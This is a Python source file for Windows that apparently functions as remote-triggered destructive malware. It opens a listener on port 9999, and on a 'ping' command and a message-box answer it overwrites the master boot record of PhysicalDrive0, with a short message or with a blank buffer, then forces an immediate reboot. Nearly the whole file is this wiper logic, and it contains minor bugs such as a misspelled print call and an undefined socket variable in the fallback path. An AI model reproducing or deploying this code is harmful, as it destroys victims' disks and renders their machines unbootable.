import os 
import time
import socket
import threading
import subprocess
from os import system 
# PLEASE RUN `os.system('pip install pywin32')` to have this work properly 
from win32file import * 
from win32ui import * 
from win32con import * 
from win32gui import * 
from sys import exit 

def placeholder1(): # for extra destructive functions
  print(" ")
  print("I have been made known!")

def placeholder2(): # for extra destructive functions
  print(" ")
  prnt("I have also been made known!")

def write_mbr(message):
    try:
        # Open the physical drive (requires admin privileges)
        with open(r'\\.\PhysicalDrive0', 'r+b') as drive:
            mbr = drive.read(512)
          
            message = message.ljust(512, b'\x00')[:512]
            drive.seek(0)
            drive.write(message)
            print("succses")
    except Exception as e:
        client_socket.send(b'mbr overwrite with message failed... overwriting without message instead')
        mbr_wm()


def mbr(): # overwrite with message
  message = b"OverWriten!    "
  write_mbr(message)
  time.sleep(0.1)
  os.system("shutdown /r /t 1")


def mbr_wm(): # if failed will overwrite without message
  hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create handle
  WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite MBR!
  CloseHandle(hDevice) # Close the handle
  time.sleep(0.1)
  os.system("shutdown /r /t 1")

def place_holder():
  warningtitle = 'Placeholder'
  warningdescription = 'placeholder'
  if MessageBox(warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7:
    placeholder1()
    placeholder2()
    mbr()

def handle_client(client_socket):
    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'ping':
            for i in range(10, 0, -1):
                client_socket.send(f'ping received, executing in {i}'.encode())
                time.sleep(1)
            client_socket.send(b'loading...')
            place_holder() # may god bless us all...
        elif command.lower() == 'exit':
            client_socket.send(b'breaking')
            break
    client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    print('Listening on port 9999...')
    
    while True:
        client_socket, addr = server.accept()
        print(f'Accepted connection from {addr}')
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == '__main__':
    main()
